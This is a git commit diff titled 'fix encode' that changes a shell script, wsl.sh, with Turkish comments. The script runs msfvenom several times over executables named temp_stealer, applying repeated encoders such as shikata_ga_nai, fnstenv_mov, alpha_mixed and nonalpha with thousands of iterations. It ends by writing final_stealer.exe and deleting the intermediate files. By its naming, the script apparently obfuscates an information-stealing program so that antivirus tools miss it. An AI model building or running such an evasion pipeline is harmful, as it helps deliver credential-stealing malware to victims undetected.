be19f6dfd9568d0afbe10c7bf3041d605ded5ba7
Lunix <cyln.elif1@gmail.com>
2024-09-22 17:43:09 +0300

    fix encode

--- wsl.sh
+++ wsl.sh
@@ -13,10 +13,10 @@ msfvenom -x temp_stealer.exe -p generic/custom --arch x86 -e x86/shikata_ga_nai 
 msfvenom -x temp_stealer_v2.exe -p generic/custom --arch x86 -e x86/fnstenv_mov -i 5000 -f exe -o temp_stealer_v3.exe
 
 # Dördüncü encode işlemi
-msfvenom -x temp_stealer_v3.exe -p generic/custom --arch x86 -e x86/alpha_mixed -i 20 -f exe -o temp_stealer_v4.exe
+msfvenom -x temp_stealer_v3.exe -p generic/custom --arch x86 -e x86/alpha_mixed -i 15 -f exe -o temp_stealer_v4.exe
 
 # Beşinci encode işlemi
-msfvenom -x temp_stealer_v4.exe -p generic/custom --arch x86 -e x86/service -i 5000 -f exe -o stealer.exe
+msfvenom -x temp_stealer_v4.exe -p generic/custom --arch x86 -e x86/nonalpha -i 5000 -f exe -o final_stealer.exe
 
 # Temizlik
 rm temp_stealer.exe temp_stealer_v2.exe temp_stealer_v3.exe temp_stealer_v4.exe 
